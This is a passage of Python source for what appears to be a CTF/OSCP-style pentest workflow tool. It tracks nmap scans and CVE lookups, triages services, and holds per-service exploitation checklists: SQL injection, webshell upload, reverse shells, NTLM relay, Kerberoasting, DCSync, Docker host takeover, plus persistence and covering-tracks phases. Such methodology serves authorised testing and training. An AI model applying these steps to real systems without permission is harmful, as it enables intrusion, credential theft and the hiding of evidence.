              f"{len(fingerprinted)} fingerprinted" if fingerprinted else ("NSE output" if (host_scripts or scripted) else "")),
        "3": (bool(vuln_findings), f"{len(vuln_findings)} vuln finding(s)" if vuln_findings else ""),
        "4": (bool(cve_findings), f"{n_cve} CVE" if cve_findings else ""),
        "5": (phase5_done, f"{n_svc_done}/{len(targets)} services" if targets else ""),
        "6": (privesc_done, privesc_detail),
        "7": (persist_done, persist_detail),
        "8": (cover_done, cover_detail),
    }

    print(f"\n{BOLD}{ip} — progress{RESET}")
    if not known and not ports and not vulns and not jobstate:
        print(f"  {DIM}nothing recorded for this host yet — run {BOLD}[0] Host discovery{RESET}"
              f"{DIM} / {BOLD}[1] Port enumeration{RESET}{DIM} first{RESET}")
        return

    done = 0
    for key, name, _desc in PHASES:
        has, detail = evidence[key]
        # phases 5-8 are manual checklists (no background jobs) — completion is driven by
        # the checklist evidence above, not job state.
        st = None if key in ("5", "6", "7", "8") else jobstate.get(key)
        if st == "running":
            sym, col, label = "⏳", YELLOW, "running"
        elif has or st == "done":
            sym, col, label = "✓", GREEN, "complete"
            done += 1
        elif st == "error":
            sym, col, label = "✗", RED, "error"
        elif st == "aborted":
            sym, col, label = "⊘", MAGENTA, "aborted"
        else:
            sym, col, label = "○", DIM, "not run"
        extra = f"  {DIM}· {detail}{RESET}" if detail else ""
        print(f"  {col}{sym} [{key}] {name:<20}{RESET} {col}{label:<9}{RESET}{extra}")
    print(f"\n  {DIM}{done}/{len(PHASES)} phase(s) complete{RESET}")


def _launch_phase_for(key: str, ip: str) -> None:
    """Run one workflow phase for a host chosen in the progress view — same launch path
    as the per-phase handlers, but the IP is already known so it's not re-typed."""
    _sync_hosts_block(ip)     # running any command on a host materialises its DB domains → hosts (root)
    if key == "0":
        print(f"{DIM}note: host discovery scans a subnet/range, not one host — use "
              f"{BOLD}[0]{RESET}{DIM} from the menu{RESET}")
        return
    if key == "8":
        _os_checklist_for(ip, "cover", "Covering Tracks", _COVER_STEPS)
        return
    if key == "7":
        _os_checklist_for(ip, "persist", "Persistence", _PERSIST_STEPS)
        return
    if key == "6":
        _os_checklist_for(ip, "privesc", "Privilege Escalation", _PRIVESC_STEPS)
        return
    if key == "5":
        _exploit_targets_view(ip)                            # service exploitation checklist
        return
    if key == "4":
        if not os.path.exists(CVE_INDEX_PATH):
            print(f"\n{YELLOW}⚠ CVE index not found{RESET} {DIM}({os.path.basename(CVE_INDEX_PATH)}) "
                  f"— build it with the installer's NVD step, then retry{RESET}")
            return
        if not fetch_services(ip):
            print(f"{DIM}note: no services recorded for {ip} — run {BOLD}[2] Service "
                  f"detection{RESET}{DIM} first{RESET}")
            return
        _do_cve_lookup(ip)
        return
    # phases 1–3: background nmap scans on a time budget
    if key == "2" and not fetch_ports(ip):
        print(f"{DIM}note: no open ports recorded for {ip} — run {BOLD}[1] Port "
              f"enumeration{RESET}{DIM} first (OS scan still runs if root){RESET}")
    if key == "3" and not fetch_ports(ip):
        print(f"{DIM}note: no open ports recorded for {ip} — run {BOLD}[1] Port "
              f"enumeration{RESET}{DIM} (and {BOLD}[2] Service detection{RESET}{DIM}) first{RESET}")
        return
    name = _PHASES[key][0]
    if key == "3":
        print(f"{DIM}vuln + auth scripting{RESET}")
    module = {"1": "ports", "2": "service", "3": "vuln"}[key]
    minutes = _prompt_minutes(module, name, ip)
    if minutes is None:
        return
    if key == "1":
        _start_port_enum(ip, minutes)
        detail = "fast + full TCP + UDP"
    elif key == "2":
        _start_service_detection(ip, minutes)
        detail = "-sV -sC + OS"
    else:
        _start_vuln_scan(ip, minutes)
        detail = "targeted NSE vuln+auth"
    print(f"\n{GREEN}▶ {name.lower()} running in the background{RESET} "
          f"{DIM}({ip} · {detail}, ⏱ {minutes}m) — check {BOLD}[s] status{RESET}")


def _open_host_progress(ip: str) -> None:
    """Interactive progress view for a known host: run a phase by number, or jump to its
    findings with [f]. Reused from the database (p <n>) and the host's other sub-views."""
    def _handle(_c, v):
        if v == "":
            return "refresh"
        if v == "f":
            _host_findings_view(ip)
            return "refresh"
        if v == "s":
            _status_view()
            return "refresh"
        if v in _PHASES:
            _launch_phase_for(v, ip)
            return "refresh"
        print(f"{RED}✗ unknown option{RESET} {DIM}— <n> run phase · f · s · b · enter{RESET}")
        return "stay"

    _run_view(f"{ip}/progress",
              "[Enter] refresh · <n> run phase · [f] findings · [s] status · [b] back · [m] menu",
              lambda: _render_host_progress(ip), _handle)


# ── service exploitation (phase 6) ────────────────────────────────────────────
# Services are triaged in CTF/OSCP order: the ones that most often give a fast foothold
# or rich enumeration come first, so you know what to hit first. Each entry is
#   (key, label, {typical ports}, (match tokens for cpe/product/name, all lowercased)).
# A service's class is resolved by the cascade CPE → product/version → service name →
# port default — strongest signal first, port number only as a last resort.
_EXPLOIT_SERVICES = [
    ("http",    "HTTP / web app",     {80, 81, 443, 591, 2082, 2087, 3000, 5000, 5601,
                                       7001, 8000, 8008, 8080, 8081, 8443, 8500, 8888,
                                       9000, 9090, 15672},
     ("http", "https", "ssl/http", "nginx", "apache", "httpd", "iis", "tomcat",
      "jetty", "lighttpd", "werkzeug", "gunicorn", "express", "haproxy", "caddy")),
    ("smb",     "SMB / file shares",  {137, 138, 139, 445},
     ("smb", "microsoft-ds", "netbios-ssn", "netbios", "samba", "cifs")),
    ("winrm",   "WinRM (remote shell)", {5985, 5986}, ("winrm", "wsman")),
    ("ftp",     "FTP",                {21, 990, 2121},
     ("ftp", "vsftpd", "proftpd", "pure-ftpd", "filezilla", "ftpd")),
    ("tftp",    "TFTP (UDP)",         {69}, ("tftp",)),
    ("nfs",     "NFS / RPC mounts",   {111, 2049},
     ("nfs", "rpcbind", "portmap", "mountd")),
    ("afp",     "AFP (Apple shares)", {548}, ("afp", "netatalk", "apple filing")),
    ("rsync",   "rsync",              {873}, ("rsync",)),
    ("distcc",  "distcc (RCE)",       {3632}, ("distcc",)),
    ("redis",   "Redis",              {6379, 6380}, ("redis",)),
    ("memcached", "Memcached",        {11211}, ("memcache",)),
    ("elastic", "Elasticsearch",      {9200, 9300}, ("elasticsearch", "elastic")),
    ("mongodb", "MongoDB",            {27017, 27018}, ("mongodb", "mongod", "mongo")),
    ("couchdb", "CouchDB",            {5984, 6984}, ("couchdb",)),
    ("neo4j",   "Neo4j",              {7474, 7687}, ("neo4j",)),
    ("influxdb", "InfluxDB",          {8086}, ("influxdb", "influx")),
    ("amqp",    "AMQP / RabbitMQ",    {5672}, ("amqp", "rabbitmq")),
    ("epmd",    "Erlang epmd",        {4369}, ("epmd", "erlang port mapper")),
    ("docker",  "Docker API",         {2375, 2376}, ("docker",)),
    ("jdwp",    "Java JDWP (RCE)",    {8787}, ("jdwp", "java debug")),
    ("rmi",     "Java RMI",           {1050, 1098, 1099}, ("rmi", "jrmi")),
    ("clamav",  "ClamAV (RCE)",       {3310}, ("clamav",)),
    ("ajp",     "AJP / Tomcat (Ghostcat)", {8009}, ("ajp13", "ajp")),
    ("svn",     "SVN (svnserve)",     {3690}, ("svn", "subversion")),
    ("mysql",   "MySQL / MariaDB",    {3306}, ("mysql", "mariadb")),
    ("mssql",   "MS SQL Server",      {1433, 1434}, ("ms-sql", "mssql", "microsoft sql")),
    ("psql",    "PostgreSQL",         {5432}, ("postgresql", "postgres")),
    ("oracle",  "Oracle DB",          {1521, 1748, 1754, 1808, 1809, 2100},
     ("oracle", "tns")),
    ("mqtt",    "MQTT (IoT)",         {1883, 8883}, ("mqtt", "mosquitto")),
    ("ldap",    "LDAP / AD",          {389, 636, 3268, 3269}, ("ldap",)),
    ("kerberos", "Kerberos (AD)",     {88, 464}, ("kerberos", "kpasswd")),
    ("msrpc",   "MSRPC endpoint",     {135, 593}, ("msrpc", "epmap")),
    ("snmp",    "SNMP",               {161, 162}, ("snmp",)),
    ("ipmi",    "IPMI (hash leak)",   {623}, ("ipmi", "asf-rmcp")),
    ("dns",     "DNS",                {53}, ("domain", "dns", "bind")),
    ("smtp",    "SMTP / mail",        {25, 465, 587}, ("smtp",)),
    ("mail2",   "POP3 / IMAP",        {110, 143, 993, 995}, ("pop3", "imap")),
    ("telnet",  "Telnet",             {23}, ("telnet",)),
    ("irc",     "IRC",                {6660, 6667, 6669, 6697}, ("irc", "ircd", "unreal")),
    ("rdp",     "RDP",                {3389}, ("ms-wbt-server", "rdp", "terminal serv")),
    ("vnc",     "VNC",                {5900, 5901, 5902, 5903}, ("vnc",)),
    ("ssh",     "SSH",                {22, 2222}, ("ssh", "openssh", "dropbear")),
    ("squid",   "Squid proxy",        {3128}, ("squid",)),
    ("cups",    "CUPS / printing",    {631}, ("cups", "ipp")),
    ("jetdirect", "Printer (JetDirect/PJL)", {9100}, ("jetdirect", "pjl")),
    ("rservices", "BSD r-services",   {512, 513, 514}, ("rlogin", "rexec", "rsh", "rshd")),
    ("x11",     "X11",                {6000, 6001, 6002, 6003, 6004, 6005}, ("x11",)),
    ("finger",  "Finger",             {79}, ("finger",)),
    ("ident",   "ident (user enum)",  {113}, ("ident", "identd")),
    ("rtsp",    "RTSP (cameras)",     {554, 8554}, ("rtsp",)),
    ("sip",     "SIP / VoIP",         {5060, 5061}, ("sip",)),
    ("nntp",    "NNTP",               {119}, ("nntp",)),
]
_EXPLOIT_RANK = {key: i for i, (key, *_rest) in enumerate(_EXPLOIT_SERVICES)}
_EXPLOIT_UNKNOWN = ("other", "other / unknown")   # fallback bucket, always ranked last


# Per-service pentest checklist: the steps to work through once a service is picked in
# phase 6. Starter methodology (HTB/OSCP-flavoured) — each service gets a deeper, curated
# pass later. Keyed by the service class key; 'other' is the generic fallback.
_EXPLOIT_STEPS = {
    "http": [
        # ── fingerprint & recon ──
        ("Read response headers, status & redirects — Server, X-Powered-By, cookies; a 30x Location often leaks a vhost",
         "http-headers"),
        ("Fingerprint the web stack — server, framework, CMS and their versions",
         "http-fingerprint"),
        ("Harvest extra hostnames / vhosts / emails from the TLS certificate — add them to /etc/hosts",
         "ssl-cert"),
        ("Look up public exploits for the exact server / CMS / app versions you found",
         "searchsploit"),
        # ── manual inspection ──
        ("Mine page source + linked JS — comments, endpoints, API routes, leaked creds/keys",
         "http-source"),
        ("Check robots.txt / sitemap.xml / .well-known + error pages for hidden paths & tech leaks",
         "http-wellknown"),
        ("Inspect cookies & sessions — flags, predictable IDs; decode & attack JWTs (alg:none / weak secret)",
         "http-cookies"),
        # ── content discovery ──
        ("Discover virtual hosts & subdomains on this IP — hidden apps often hold the vuln",
         "vhost-fuzz"),
        ("Brute-force directories & files on the default host and every discovered vhost (php,asp,aspx,txt,bak,zip)",
         "dir-brute"),
        ("Hunt exposed VCS / backups / config — .git .svn .env web.config *.bak *~ config.php",
         "vcs-hunt"),
        ("Discover hidden parameters on dynamic endpoints",
         "param-hunt"),
        # ── CMS enumeration (run early — a vulnerable plugin can shortcut straight to RCE) ──
        ("CMS-specific scan (wpscan / droopescan) → vulnerable plugins, themes, versions, users",
         "cms-scan"),
        # ── authentication & access control ──
        ("Try default / weak creds on every login and admin panel (admin:admin, product defaults)",
         "default-creds"),
        ("Test auth bypass (SQLi ' or 1=1 --, verbose errors, response timing) & user enumeration",
         "auth-bypass"),
        ("Targeted brute-force — only when enumeration confirms users and there is no lockout",
         "login-brute"),
        ("IDOR / broken access control — tamper IDs & roles to reach admin / other users",
         "idor-bac"),
        # ── injection & inclusion (OSCP core) ──
        ("Auto-dump via SQLi (OSCP-safe) — UNION/error extract of DB, tables, rows; blind for short values",
         "sqli-dump"),
        ("Full SQLi assessment — auth bypass, UNION/error/blind dump; escalate to file read & RCE",
         "sqli-scan"),
        ("LFI / path traversal → RCE via log poisoning, php://filter, /proc/self/environ",
         "lfi-scan"),
        ("RFI — include a remote webshell (allow_url_include)",
         "rfi-scan"),
        ("OS command injection (; | & ` $()) in every input → RCE (feeds the foothold step)",
         "cmdi-scan"),
        ("Server-side template injection ({{7*7}} / ${7*7}) → RCE (Jinja2 / Twig / Freemarker)",
         "ssti-scan"),
        ("XXE (XML input) & SSRF — file read, cloud metadata (169.254.169.254), out-of-band callback",
         "xxe-ssrf"),
        # ── land a shell & foothold ──
        ("File upload → webshell — bypass extension / MIME / magic bytes (.phtml, double ext, magic prefix)",
         "upload-shell"),
        ("Admin panel → RCE: upload plugin/theme, edit a template, or config code-exec",
         "admin-rce"),
        ("Spawn a reverse shell over a confirmed RCE channel and auto-upgrade it to a full interactive TTY",
         "foothold"),
        # ── stuck? manual escalations tailored to what we found ──
        ("Nothing worked? Manual next steps — bigger wordlists, Burp, CVE research on the found versions, verify unconfirmed hits",
         "next-steps"),
    ],
    "smb": [
        # ── recon (no creds) ──
        "Null / guest session: enumerate shares, users (RID cycling), groups, password policy",
        "Identify the domain, the DC(s) and each host's exact OS & SMB dialect",
        "Version RCE: MS17-010 EternalBlue, MS08-067, SMBGhost CVE-2020-0796",
        # ── loot shares ──
        "Recursively read every readable share; grep for creds, keys, configs, backups",
        "SYSVOL / NETLOGON → GPP cpassword (Groups.xml), logon scripts, unattend.xml",
        # ── poison & relay (no creds) ──
        "Poison LLMNR / NBT-NS / mDNS → capture NetNTLMv1/v2 → crack or relay",
        "SMB signing 'not required' → NTLM relay to SMB / LDAP / ADCS-ESC8 (ntlmrelayx)",
        "Coerce auth (PetitPotam / PrinterBug / DFSCoerce / Coercer) → relay to escalate (RBCD / ADCS)",
        # ── DC-critical CVEs ──
        "On a DC: ZeroLogon CVE-2020-1472, noPac CVE-2021-42278/42287 → domain takeover",
        # ── creds → exec / dump ──
        "Spray creds & hashes across users and hosts (password reuse) — mind lockout",
        "Valid admin creds/hash → shell (psexec / wmiexec / smbexec; pass-the-hash)",
        "Dump SAM / LSA / LSASS / DPAPI (secretsdump); with rights → DCSync the domain",
        "Writable share → SCF / LNK / desktop.ini for hash capture, or stage a payload",
    ],
    "winrm": [
        "Confirm WinRM transport (5985 HTTP / 5986 HTTPS)",
        "Validate & spray creds and NTLM hashes against known users (watch lockout)",
        "Valid creds or hash → interactive shell (evil-winrm; -H for pass-the-hash)",
        "Needs 'Remote Management Users' / admin membership — note who has access",
        "Via the shell: enumerate, upload tooling, run commands; reuse creds to pivot",
    ],
    "ftp": [
        "Banner & exact version → searchsploit (vsftpd 2.3.4 backdoor, ProFTPD mod_copy CVE-2015-3306)",
        "Anonymous login (anonymous:<any>) → browse the tree",
        "Download everything; test write access (upload a throwaway file)",
        "Try known / default / reused creds; targeted brute only if lockout allows",
        "If FTP root maps to a web root or is writable → drop a webshell / poison a served file",
        "FTP-bounce (PORT) to reach & scan internal hosts through the server",
    ],
    "tftp": [
        "Confirm UDP/69 (no auth)",
        "GET well-known files: running-config / startup-config, backups, app configs",
        "Test PUT (arbitrary write) → overwrite a config or drop a payload",
        "Fuzz filenames from a wordlist — device configs often leak credentials",
    ],
    "nfs": [
        "List exports & allowed clients (showmount -e; nmap nfs-*)",
        "Mount each export; test read and write",
        "no_root_squash → plant a root-owned SUID binary for post-foothold privesc",
        "Match / forge local UID-GID to read restricted files (SSH keys, configs)",
        "NFSv4 hides exports from showmount — mount the root and browse",
    ],
    "afp": [
        "Enumerate shares & server info (afp-showmount / afp-serverinfo)",
        "Try guest / anonymous, then known creds",
        "Mount & hunt Time Machine backups, keychains and configs for creds",
    ],
    "rsync": [
        "List modules (rsync rsync://IP:873/)",
        "Access modules unauth; download everything, test upload to writable modules",
        "Read sensitive files (SSH keys, configs); write to a served/executable path if writable",
        "If auth is required, try known / reused creds",
    ],
    "distcc": [
        "Confirm distccd (3632)",
        "CVE-2004-2687 → arbitrary command execution (distcc_exec or manual DIST protocol)",
        "Use the RCE to read files / stage a reverse shell, then pivot to local privesc",
    ],
    "redis": [
        "Connect unauthenticated; note version, and INFO / CONFIG GET dir,dbfilename",
        "If auth required, try default / no password, then known creds (AUTH)",
        "Read keys for creds/sessions (KEYS *, GET)",
        "Writable dir → write an SSH key (CONFIG SET dir ~/.ssh, dbfilename authorized_keys)",
        "Writable web root → write a webshell via CONFIG SET dir + SAVE",
        "RCE via malicious module (MODULE LOAD) or master/slave replication (redis-rogue-server)",
    ],
    "memcached": [
        "stats / stats items / stats slabs / stats cachedump (unauthenticated)",
        "Dump all keys and values — hunt for sessions, tokens and creds",
    ],
    "elastic": [
        "GET / (version) and /_cat/indices?v — unauthenticated",
        "Dump indices & documents for creds and sensitive data (_search)",
        "Old versions → RCE (CVE-2014-3120, CVE-2015-1427 Groovy sandbox bypass)",
        "If auth is on, try default / known creds against the REST API and Kibana (5601)",
    ],
    "mongodb": [
        "Connect unauthenticated (mongosh); if refused, try default / known creds",
        "show dbs / show collections; dump interesting collections for creds",
        "Note version → searchsploit; check for exposed admin / config data",
    ],
    "couchdb": [
        "GET /_all_dbs and read documents unauthenticated; note version",
        "CVE-2017-12635 → create an admin user (privilege escalation)",
        "CVE-2017-12636 / EMONGO → RCE via query_server config; then reverse shell",
        "Erlang cookie reuse (with epmd) → node RCE",
    ],
    "neo4j": [
        "Browser/API on 7474; try default neo4j:neo4j and known creds",
        "Cypher queries to dump nodes/relationships for creds & data",
        "APOC / version RCE (e.g. CVE-2021-34371, apoc.* file & shell functions)",
    ],
    "influxdb": [
        "CVE-2019-20933 auth bypass (JWT signed with empty shared-secret)",
        "Enumerate databases (SHOW DATABASES) and dump measurements for creds/data",
        "If auth is on, try default / known creds against the HTTP API",
    ],
    "amqp": [
        "Try default guest:guest, then known creds",
        "Reach the management UI (15672) for queues, vhosts, users",
        "Enumerate & drain queues — messages often carry creds / internal data",
        "Erlang cookie (with epmd 4369) → node RCE on RabbitMQ",
    ],
    "epmd": [
        "List Erlang nodes & ports (epmd -names)",
        "Find / guess the Erlang cookie (~/.erlang.cookie, reused across nodes)",
        "Cookie → connect to the node and run erlang:os_cmd → RCE",
        "Common on RabbitMQ / CouchDB clusters — pivot into those",
    ],
    "docker": [
        "Confirm the unauthenticated Docker API (2375/2376)",
        "Enumerate: containers, images, networks (docker -H tcp://IP:2375 ps/images)",
        "Run a privileged container bind-mounting the host / → read/write host filesystem",
        "chroot the mount and add a user / SSH key / cron → root on the host",
        "Loot secrets from images, env vars and volumes",
    ],
    "jdwp": [
        "Confirm the JDWP handshake (Java Debug Wire Protocol)",
        "Any-context RCE via the debugger (jdwp-shellifier / manual breakpoint)",
        "Execute Runtime.exec → reverse shell as the JVM's user",
    ],
    "rmi": [
        "Enumerate the RMI registry — bound objects & remote methods (rmi-dumpregistry, BaRMIe)",
        "Java deserialization RCE against the endpoint (ysoserial gadget chains)",
        "JMX/RMI (if exposed) → MLet MBean → load a malicious MBean for RCE",
    ],
    "ajp": [
        "Confirm AJP13 (8009) and the fronting Tomcat",
        "Ghostcat CVE-2020-1938 → read WEB-INF/web.xml, configs, source",
        "Chain to RCE if you can upload a JSP into a served path (ajpy / metasploit)",
    ],
    "clamav": [
        "Confirm clamd (3310)",
        "Command execution via clamav-exec / known CVE (SCAN a crafted path)",
        "Use the RCE to stage a reverse shell as the clamav user",
    ],
    "svn": [
        "Enumerate over svn:// (svn ls / svn log / svn info)",
        "Checkout the repo; read commit history & diffs for secrets and creds",
        "svn cat / svn up -r<n> old revisions of removed sensitive files",
    ],
    "mysql": [
        "Try root with no password, then default / reused creds",
        "Version → searchsploit (e.g. CVE-2012-2122 auth bypass)",
        "Enumerate databases & users; dump app creds & password hashes",
        "Read local files with LOAD_FILE (needs FILE priv / secure_file_priv)",
        "Write a webshell with INTO OUTFILE into a writable web root",
        "UDF (lib_mysqludf_sys) for OS command execution if the plugin dir is writable",
    ],
    "mssql": [
        "Try sa with blank / default, then known creds (impacket mssqlclient / netexec mssql)",
        "Enable & use xp_cmdshell for OS command execution → reverse shell",
        "Enumerate linked servers; EXECUTE AS / trustworthy DB for privilege abuse",
        "Coerce the service account's NetNTLM hash (xp_dirtree / xp_fileexist) → crack / relay",
        "Read/write files (OPENROWSET / bulk); loot connection strings",
    ],
    "psql": [
        "Try postgres with blank / default, then known creds",
        "COPY … FROM/TO PROGRAM → OS command execution (9.3+) → reverse shell",
        "Read/write server files (pg_read_file / lo_import/lo_export / COPY)",
        "Enumerate databases & roles; dump app creds; check superuser",
    ],
    "oracle": [
        "Enumerate the SID (oracle-sid-brute / odat sidguesser)",
        "Brute default accounts (scott/tiger, system/manager, dbsnmp/dbsnmp) — odat passwordguesser",
        "With creds → file read/write, privesc and RCE via odat (dbmsscheduler / externaltable)",
        "TNS poisoning / version CVEs on older listeners",
    ],
    "mqtt": [
        "Connect anonymously and subscribe to all topics (# wildcard) — sniff for data/creds",
        "Enumerate topics & retained messages; look for device control / secrets",
        "Publish to control topics to influence devices; note impact",
        "If auth is on, try default / known creds against the broker",
    ],
    "ldap": [
        # ── enumerate ──
        "Anonymous / authenticated bind → dump users, groups, computers, OUs, trusts (ldapsearch / windapsearch)",
        "Read description / info / userPassword fields; extract naming context & password policy",
        "Map attack paths with BloodHound (LDAP collector) — ACLs, sessions, GPOs, delegation",
        # ── roast targets ──
        "Flag AS-REP (DONT_REQ_PREAUTH) and Kerberoast (servicePrincipalName) targets",
        # ── loot secrets from LDAP ──
        "Read LAPS (ms-Mcs-AdmPwd) and gMSA passwords (ReadGMSAPassword) where allowed",
        # ── ACL & object abuse (write rights) ──
        "ACL abuse: GenericAll/Write, WriteDACL/Owner, ForceChangePassword, AddMember (bloodyAD / dacledit)",
        "Shadow credentials: write msDS-KeyCredentialLink → PKINIT auth (pywhisker / certipy)",
        "RBCD: write msDS-AllowedToActOnBehalfOfOtherIdentity → S4U impersonation",
        # ── ADCS ──
        "Enumerate CA & templates (certipy find) → ESC1-ESC16 → cert as any user → PKINIT → DA",
        # ── relay / DCSync ──
        "Relay coerced auth to LDAP(S) when signing / channel-binding is off → RBCD / shadow cred",
        "With replication rights (DS-Replication-Get-Changes*) → DCSync all hashes",
    ],
    "kerberos": [
        # ── no creds ──
        "Enumerate valid users via AS-REQ (kerbrute userenum)",
        "AS-REP roast accounts with pre-auth disabled → crack offline",
        "Password-spray discovered users (Kerberos, lockout-aware)",
        # ── with creds ──
        "Kerberoast SPN accounts → crack service passwords offline",
        # ── delegation ──
        "Unconstrained delegation → coerce a DC/host & capture its TGT (printerbug + monitor)",
        "Constrained delegation → S4U2proxy to impersonate users to the allowed SPNs",
        "RBCD → S4U2self + S4U2proxy to mint a service ticket as any user",
        # ── ticket attacks ──
        "Overpass-the-hash (NT hash → TGT); pass-the-ticket to reuse tickets",
        "Silver ticket (service key) / golden ticket (krbtgt) / diamond ticket",
        # ── critical ──
        "noPac (CVE-2021-42278/42287) & MS14-068 → impersonate a DC / domain admin",
    ],
    "msrpc": [
        "Map endpoints via the endpoint mapper (rpcdump) → services & their dynamic ports",
        "SAMR / LSARPC over rpcclient (null or creds): enumdomusers, RID cycle, group members, lsaquery",
        "Coerce auth: MS-RPRN PrinterBug, MS-EFSR PetitPotam, MS-DFSNM DFSCoerce, Coercer → relay / crack",
        "ZeroLogon (MS-NRPC CVE-2020-1472) → reset the DC machine account → DCSync",
        "Remote exec with creds via Task Scheduler (atexec) or Service Control Manager (scmexec / smbexec)",
        "DRSUAPI → DCSync with replication rights; abuse other interfaces (EVEN6, WKSSVC) as found",
    ],
    "snmp": [
        "Brute community strings with a wordlist (onesixtyone: public, private, community)",
        "snmpwalk the full tree — hostname, users, processes, routes, ARP, listening ports, software",
        "Extended MIBs: running processes with arguments (creds!), installed software, local users",
        "Grab configs/creds: Cisco running-config (1.3.6.1.4.1.9.9.96), SNMPv3 USM users",
        "Writable (RW) community → tamper config, or NET-SNMP EXTEND / EXEC MIB → command execution",
        "SNMPv3 → enumerate & brute usernames / auth (snmpv3-brute)",
    ],
    "ipmi": [
        "Dump BMC password hashes — RAKP auth flaw CVE-2013-4786 (ipmi_dumphashes)",
        "Crack the hashes offline (hashcat mode 7300)",
        "Cipher-0 auth bypass → add/modify a BMC admin, then get to the host console",
        "Default vendor creds (ADMIN/ADMIN, root/calvin on iDRAC)",
    ],
    "dns": [
        "Zone transfer (AXFR) against each nameserver → full record dump",
        "Version query (version.bind CHAOS TXT)",
        "Reverse-lookup the subnet & brute-force subdomains → new hosts/vhosts",
        "Note internal names for /etc/hosts and vhost routing; check dynamic-update/cache-poison",
    ],
    "smtp": [
        "Banner & exact version → searchsploit (Exim CVE-2019-10149, Postfix Shellshock)",
        "Username enumeration via VRFY / EXPN / RCPT TO (smtp-user-enum) → valid AD/local users",
        "Open-relay test → spoof/phish internal users from a trusted-looking sender",
        "Authenticate with reused creds; read internal mail for creds & info",
        "Command injection / template / known MTA RCE → shell as the mail service",
        "Client-side: deliver a malicious attachment / link if a user reads mail",
    ],
    "mail2": [
        "Banner & version (POP3/IMAP) → searchsploit",
        "Authenticate with reused / known creds",
        "Read mailboxes for credentials, tokens and internal information",
    ],
    "telnet": [
        "Banner → identify the device / OS / service",
        "No-auth access or a backdoor prompt?",
        "Default / known creds; careful, targeted brute (lockout-aware)",
        "Sniff cleartext creds if you can MITM the segment",
    ],
    "irc": [
        "Connect; enumerate channels, users and the server software/version",
        "UnrealIRCd 3.2.8.1 backdoor (CVE-2010-2075) → RCE",
        "searchsploit the ircd; try oper default creds",
    ],
    "rdp": [
        "Check NLA & security layer; grab the machine/domain name (rdp-sec-check / nmap)",
        "Known / weak / reused creds & pass-the-hash (careful with lockout)",
        "BlueKeep CVE-2019-0708 (unpatched 7/2008R2) → RCE",
        "Valid creds → interactive session (xfreerdp; /cert:ignore, drive redirect for transfer)",
        "Post-access: dump creds, enable further access",
    ],
    "vnc": [
        "Connect directly — is there any auth at all?",
        "Weak/short password → crack the VNC challenge-response",
        "Recover stored VNC passwords elsewhere (fixed-key DES) and decrypt",
        "Version CVE (e.g. RealVNC auth bypass) → view / control the desktop",
    ],
    "ssh": [
        "Banner → exact version; searchsploit (libssh CVE-2018-10933 auth bypass, older OpenSSH)",
        "Enumerate valid users (OpenSSH < 7.7 CVE-2018-15473) & list supported auth methods",
        "Reused / known creds & private keys found elsewhere; targeted spray (lockout-aware)",
        "Crack an encrypted private key you recover (ssh2john → hashcat)",
        "After access: pivot — local/remote/dynamic port-forward & tunnelling into internal nets",
        "Restricted shell (rbash / lshell) → escape (ssh -t, command tricks) to a full shell",
        "authorized_keys / SSH-agent abuse for lateral movement & persistence",
        "Weak host key algorithms / Terrapin CVE-2023-48795 — note downgrade risk",
    ],
    "squid": [
        "Use it as a proxy to reach internal hosts & ports (proxychains)",
        "Port-scan / access internal-only services through the proxy",
        "cachemgr info-leak (cache_object://) → internal targets & config",
        "Try creds if the proxy requires auth (reused)",
    ],
    "cups": [
        "Admin web UI on 631/admin; note version",
        "Recent CUPS RCE chain (CVE-2024-47176 …) via a crafted printer/IPP",
        "Enumerate printers & captured jobs; read config for creds",
    ],
    "jetdirect": [
        "PJL / PostScript access (PRET) — filesystem, NVRAM, display",
        "Read/write the printer filesystem; retrieve stored jobs & configs",
        "Extract stored credentials (LDAP/SMB pass-back), captured print jobs",
    ],
    "rservices": [
        "rlogin / rsh / rexec via a trusted host or missing auth",
        "~/.rhosts or /etc/hosts.equiv abuse → log in as root without a password",
    ],
    "x11": [
        "Confirm access is unauthenticated (xdpyinfo / x11-access)",
        "Screenshot the session (xwd); read window contents",
        "Keylog and inject keystrokes to run commands as the logged-in user",
    ],
    "finger": [
        "Enumerate users (finger @IP; finger root@IP) — real names, last login, home",
        "Build a validated user list to feed brute-force / spray on other services",
    ],
    "ident": [
        "Query the owner of each open port (ident-user-enum)",
        "Map services to local user accounts — pick brute-force targets",
    ],
    "rtsp": [
        "Enumerate stream URLs (rtsp-url-brute / Cameradar)",
        "Default / weak camera creds; view the stream",
        "searchsploit the camera/DVR firmware for RCE",
    ],
    "sip": [
        "Enumerate extensions & the PBX (svmap / svwar)",
        "Crack / spray extension passwords (svcrack); register a rogue endpoint",
        "Sniff SIP creds; test toll fraud / call interception",
    ],
    "nntp": [
        "Banner & version → searchsploit",
        "List newsgroups and read articles for info",
        "Try auth / posting; check for an auth bypass",
    ],
    "other": [
        "Grab the banner (nc / telnet / openssl s_client) and identify the service",
        "searchsploit the product & version; check exploit-db / GitHub",
        "Look the port & protocol up in HackTricks for a methodology",
        "Try default / anonymous credentials",
        "Run the protocol's nmap scripts (--script '<name>-*') for quick wins",
        "Interact manually to understand the protocol; note it for deeper research",
    ],
}


def _classify_service(port: int, name, product, version, cpe) -> tuple:
    """Resolve one open port to a service class by the cascade CPE → product/version →
    service name → port default. Returns (label, key, signal) where signal names the
    level that matched (cpe / version / service / port) — a proxy for how much to trust
    it (a port-only guess is far weaker than a CPE/version fingerprint)."""
    sources = (
        ("cpe",     (cpe or "").lower()),
        ("version", f"{product or ''} {version or ''}".lower()),
        ("service", (name or "").lower()),
    )
    for signal, text in sources:
        if not text.strip():
            continue
        for key, label, _ports, tokens in _EXPLOIT_SERVICES:
            if any(tok in text for tok in tokens):
                return label, key, signal
    for key, label, ports, _tokens in _EXPLOIT_SERVICES:
        if port in ports:
            return label, key, "port"
    # unrecognised: still show nmap's own service name if it gave one (so the row is
    # useful for research), else a bare 'other'. Stays keyed 'other' → ranked last, no tool.
    if name:
        return name, _EXPLOIT_UNKNOWN[0], "service"
    return _EXPLOIT_UNKNOWN[1], _EXPLOIT_UNKNOWN[0], "port"


def _exploit_targets(ip: str) -> list:
    """The host's services in exploitation-priority order (no output): a list of
    (port, proto, label, key, ver, signal). Shared by the render and the progress view."""
    services = fetch_services(ip)
    triaged = []
    for port, proto, _state in fetch_ports(ip):
        name, product, version, cpe = services.get((port, proto), (None, None, None, None))
        label, key, signal = _classify_service(port, name, product, version, cpe)
        rank = _EXPLOIT_RANK.get(key, len(_EXPLOIT_SERVICES))
        ver = " ".join(x for x in (product, version) if x)
        triaged.append((rank, port, proto, label, key, ver, signal))
